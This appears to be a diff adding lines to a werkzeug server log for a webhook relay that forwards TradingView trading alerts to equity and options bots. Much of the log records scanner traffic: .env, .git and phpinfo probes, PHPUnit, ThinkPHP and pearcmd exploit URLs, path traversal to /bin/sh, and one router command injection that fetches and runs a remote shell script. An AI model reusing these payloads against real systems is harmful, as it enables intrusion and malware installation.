+2025-12-02 10:42:03,467 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:42:03,468 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 10:42:03] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:48:03,405 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:48:03,406 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:48:03,406 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#9)
+2025-12-02 10:48:03,406 - __main__ - INFO - ======================================================================
+2025-12-02 10:48:03,406 - __main__ - INFO - Symbol: INOXWIND
+2025-12-02 10:48:03,406 - __main__ - INFO - Action: BUY
+2025-12-02 10:48:03,406 - __main__ - INFO - Price: 133.12
+2025-12-02 10:48:03,406 - __main__ - INFO - Timestamp: 2025-12-02T10:48:03.406497
+2025-12-02 10:48:03,406 - __main__ - INFO - Payload: {
+  "symbol": "INOXWIND",
+  "action": "BUY",
+  "price": "133.12",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "132.39",
+  "rsi": "64.94",
+  "atr": "0.24",
+  "adx": "27.18",
+  "volume": "91705.00",
+  "ema9": "132.64",
+  "ema20": "132.58",
+  "pdh": "135.79",
+  "ema_gap_pct": "0.36",
+  "vwap_lead_pct": "0.55",
+  "atr_pct": "0.18",
+  "vol_z": "3.11",
+  "z_rsi": "3.17",
+  "heat_ok": "1.00",
+  "body_ratio": "0.84",
+  "open_gap_pct": "0.01",
+  "hl_range_pct": "0.50",
+  "pc_lead_pct": "0.41",
+  "close_to_high": "83.58",
+  "atr_jump": "0.02",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:48:03,406 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:48:03,406 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:48:03,417 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:48:03,429 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:48:03,430 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:48:03,430 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 10:48:03] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:52:52,798 - werkzeug - INFO - 213.209.157.254 - - [02/Dec/2025 10:52:52] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+2025-12-02 10:54:33,608 - werkzeug - INFO - 146.190.29.141 - - [02/Dec/2025 10:54:33] "GET / HTTP/1.1" 200 -
+2025-12-02 10:58:42,871 - werkzeug - INFO - 204.76.203.52 - - [02/Dec/2025 10:58:42] "GET / HTTP/1.1" 200 -
+2025-12-02 11:10:07,458 - werkzeug - INFO - 204.76.203.52 - - [02/Dec/2025 11:10:07] "GET / HTTP/1.1" 200 -
+2025-12-02 11:15:05,346 - werkzeug - INFO - 192.159.99.95 - - [02/Dec/2025 11:15:05] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=`busybox%20wget%20-qO-%20http://70.184.13.47/rondo.zqq.sh|sh` HTTP/1.1[0m" 404 -
+2025-12-02 11:20:21,341 - werkzeug - INFO - 79.124.40.174 - - [02/Dec/2025 11:20:21] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+2025-12-02 11:21:37,201 - werkzeug - INFO - 192.159.99.180 - - [02/Dec/2025 11:21:37] "GET / HTTP/1.1" 200 -
+2025-12-02 11:22:02,324 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:02] "[33mGET /.env HTTP/1.1[0m" 404 -
+2025-12-02 11:22:02,892 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:02] "[33mGET /prod/.env HTTP/1.1[0m" 404 -
+2025-12-02 11:22:03,404 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:03] "[33mGET /backend/.env HTTP/1.1[0m" 404 -
+2025-12-02 11:22:03,921 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:03] "[33mGET /app/.env HTTP/1.1[0m" 404 -
+2025-12-02 11:22:04,442 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:04] "[33mGET /api/.env HTTP/1.1[0m" 404 -
+2025-12-02 11:22:04,958 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:04] "[33mGET /vendor/stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:05,464 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:05] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+2025-12-02 11:22:05,974 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:05] "[33mGET /info.php HTTP/1.1[0m" 404 -
+2025-12-02 11:22:06,484 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:06] "[33mGET /phpinfo.php HTTP/1.1[0m" 404 -
+2025-12-02 11:22:06,994 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:06] "[33mGET /config.json HTTP/1.1[0m" 404 -
+2025-12-02 11:22:07,514 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:07] "[33mGET /config.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:08,054 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:08] "[33mGET /data.json HTTP/1.1[0m" 404 -
+2025-12-02 11:22:08,572 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:08] "[33mGET /data.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:09,080 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:09] "[33mGET /server.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:09,600 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:09] "[33mGET /stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:10,120 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:10] "[33mGET /js/stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:10,641 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:10] "[33mGET /webflow-stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:11,168 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:11] "[33mGET /lib/helpers/stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:22:11,695 - werkzeug - INFO - 52.3.228.24 - - [02/Dec/2025 11:22:11] "[33mGET /models/stripe.js HTTP/1.1[0m" 404 -
+2025-12-02 11:25:55,963 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:25:55] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+2025-12-02 11:25:57,013 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:25:57] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+2025-12-02 11:25:58,161 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:25:58] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+2025-12-02 11:25:59,074 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:25:59] "[31m[1mPOST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 405 -
+2025-12-02 11:26:00,044 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:00] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:01,031 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:01] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:02,058 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:02] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:03,051 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:03] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:03,952 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:03] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:04,745 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:04] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:05,655 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:05] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:06,641 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:06] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:07,455 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:07] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:08,364 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:08] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:09,308 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:09] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:10,230 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:10] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:11,190 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:11] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:12,070 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:12] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:12,866 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:12] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:13,682 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:13] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:14,663 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:14] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:15,790 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:15] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:16,792 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:16] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:17,619 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:17] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:18,391 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:18] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:19,223 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:19] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:20,251 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:20] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:21,247 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:21] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:22,248 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:22] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:23,219 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:23] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:24,076 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:24] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:25,051 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:25] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:25,936 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:25] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:26,747 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:26] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:27,722 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:27] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:28,605 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:28] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:29,466 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:29] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:30,288 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:30] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:31,222 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:31] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:32,148 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:32] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:32,962 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:32] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:33,776 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:33] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+2025-12-02 11:26:34,744 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:34] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+2025-12-02 11:26:35,565 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:35] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+2025-12-02 11:26:36,440 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:36] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+2025-12-02 11:26:37,438 - werkzeug - INFO - 128.199.103.139 - - [02/Dec/2025 11:26:37] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+2025-12-02 11:33:18,515 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:18] "GET / HTTP/1.0" 200 -
+2025-12-02 11:33:18,904 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:18] "GET / HTTP/1.0" 200 -
+2025-12-02 11:33:18,908 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:18] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+2025-12-02 11:33:18,911 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:18] "[33mGET /odinhttpcall1764655398 HTTP/1.1[0m" 404 -
+2025-12-02 11:33:19,310 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:19] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+2025-12-02 11:33:19,346 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:19] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+2025-12-02 11:33:19,739 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:19] "GET / HTTP/1.0" 200 -
+2025-12-02 11:33:20,124 - werkzeug - INFO - 164.92.247.226 - - [02/Dec/2025 11:33:20] "GET / HTTP/1.1" 200 -
+2025-12-02 11:33:20,626 - werkzeug - INFO - 134.122.72.52 - - [02/Dec/2025 11:33:20] "[33mGET /cgi-bin/authLogin.cgi HTTP/1.1[0m" 404 -
+2025-12-02 11:33:20,633 - werkzeug - INFO - 46.101.114.136 - - [02/Dec/2025 11:33:20] "[33mGET /query?q=SHOW+DIAGNOSTICS HTTP/1.1[0m" 404 -
+2025-12-02 11:33:20,637 - werkzeug - ERROR - 134.122.91.234 - - [02/Dec/2025 11:33:20] code 400, message Bad request version ('À\x13À')
+2025-12-02 11:33:20,639 - werkzeug - INFO - 142.93.171.56 - - [02/Dec/2025 11:33:20] "[33mGET /solr/admin/info/system HTTP/1.1[0m" 404 -
+2025-12-02 11:33:20,640 - werkzeug - INFO - 134.122.91.234 - - [02/Dec/2025 11:33:20] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03%7\x97HkæQSüaóý\x86ùq9¼6¬9Ãô¥[E±\x1c\x08Â\x04\x12O Ù\x95dÀmd´\x8aQ¸\x15ùeO|B\x99Xq;hï\x05u\x85ä\x9dFO-p´\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+2025-12-02 11:33:20,641 - werkzeug - INFO - 138.197.191.158 - - [02/Dec/2025 11:33:20] "GET / HTTP/1.1" 200 -
+2025-12-02 11:33:20,643 - werkzeug - INFO - 46.101.114.136 - - [02/Dec/2025 11:33:20] "[33mGET /v2/_catalog HTTP/1.1[0m" 404 -
+2025-12-02 11:33:21,023 - werkzeug - ERROR - 134.122.91.234 - - [02/Dec/2025 11:33:21] code 400, message Bad request version ('À\x13À')
+2025-12-02 11:33:21,023 - werkzeug - INFO - 134.122.91.234 - - [02/Dec/2025 11:33:21] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03DÊ´«Ðÿ\x8cÓ\x10aeáE\x8eÉ\x8d}#±Ié\x89\x94Ó\x99¹\x12ör>Tù ZMê\x1c\x9fÒb!ª=Áºl\x0fnÅ´Yø Ünb\x122U]Ú\x8c/Q7\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+2025-12-02 11:33:21,026 - werkzeug - INFO - 142.93.171.56 - - [02/Dec/2025 11:33:21] "[33mGET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1[0m" 404 -
+2025-12-02 11:33:21,090 - werkzeug - INFO - 174.138.27.103 - - [02/Dec/2025 11:33:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2025-12-02 11:33:21,191 - werkzeug - INFO - 161.35.67.194 - - [02/Dec/2025 11:33:21] "GET / HTTP/1.1" 200 -
+2025-12-02 11:33:21,568 - werkzeug - ERROR - 161.35.67.194 - - [02/Dec/2025 11:33:21] code 400, message Bad request version ('À\x13À')
+2025-12-02 11:33:21,568 - werkzeug - INFO - 161.35.67.194 - - [02/Dec/2025 11:33:21] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x94\x8b\x04_ò°í÷qä\x1cBNB\x10sSvÌ»§«P\\Å\x9cûaæ\x87Ë\x0c ¤PÒ\x8e,,\x1dB\x8aæxû\x1e×6Ôª°\x17\x19l`Þ[·ÅªdCÈcV\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+2025-12-02 11:34:59,646 - werkzeug - INFO - 212.83.150.6 - - [02/Dec/2025 11:34:59] "[33mGET /admin/config.php HTTP/1.0[0m" 404 -
+2025-12-02 11:57:35,590 - werkzeug - ERROR - 79.124.40.174 - - [02/Dec/2025 11:57:35] code 400, message Bad request version ('À\x13À')
+2025-12-02 11:57:35,608 - werkzeug - INFO - 79.124.40.174 - - [02/Dec/2025 11:57:35] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03rE\x05\x15È\x040\x14eør\x98£\x84ø\x065ÃÏýö\x992´\x90y½\x8b\x1eÀ*ò z®¿¡\x9dR¥ÞoÕÁV\x0dFÇ\x0c\x09ÅÆÇÈå\x99Zs\x1bnG\x00k\x05û\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
